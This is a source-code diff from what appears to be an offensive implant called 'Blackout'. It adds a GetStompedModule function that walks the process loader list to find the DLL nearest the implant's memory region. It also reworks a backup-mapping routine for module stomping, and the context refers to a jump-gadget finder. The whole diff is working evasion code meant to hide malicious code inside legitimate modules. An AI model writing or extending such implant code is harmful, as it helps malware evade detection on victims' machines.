@@ -21,12 +21,48 @@ FUNC BOOL CreateImplantBackup(
     if ( Status != 0 ) return FALSE;
 
     Status = Instance()->Win32.NtMapViewOfSection( 
-        hSection, NtCurrentProcess(), &Instance()->Blackout.Backup, 
+        hSection, NtCurrentProcess(), &Instance()->Blackout.Stomp.Backup, 
         0, 0, 0, &Instance()->Blackout.Region.Length, ViewShare, 0, PAGE_READWRITE 
     );
     if ( Status != 0 ) return FALSE;
 
     return TRUE;
+}
+
+FUNC VOID GetStompedModule(
+    VOID
+) {
+    BLACKOUT_INSTANCE
+
+    PLDR_DATA_TABLE_ENTRY Data    = { 0 };
+    PLIST_ENTRY           Head    = { 0 };
+    PLIST_ENTRY           Entry   = { 0 };
+    
+    PVOID          CurAddr           = NULL;
+    PVOID          ClosestModuleBase = NULL;
+    ULONG_PTR      MinDistance       = (ULONG_PTR)-1; 
+
+    CurAddr = Instance()->Blackout.Region.Base;
+    Head    = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList; 
+
+    for ( Entry = Head->Flink; Entry != Head; Entry = Entry->Flink ) {
+        Data = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks );
+        
+        PVOID ModuleBase = Data->DllBase;
+
+        ULONG_PTR Distance = (ULONG_PTR)ModuleBase > (ULONG_PTR)CurAddr
+                                 ? (ULONG_PTR)ModuleBase - (ULONG_PTR)CurAddr
+                                 : (ULONG_PTR)CurAddr    - (ULONG_PTR)ModuleBase;
+
+        if ( Distance < MinDistance ) {
+            MinDistance       = Distance; 
+            ClosestModuleBase = ModuleBase;  
+            Blackout().Stomp.UsMod   = Data->BaseDllName;
+            Blackout().Stomp.ModBase = Data->DllBase;
+        }
+    }
+
+    return;
 }
 
 FUNC PVOID FindJmpGadget( 
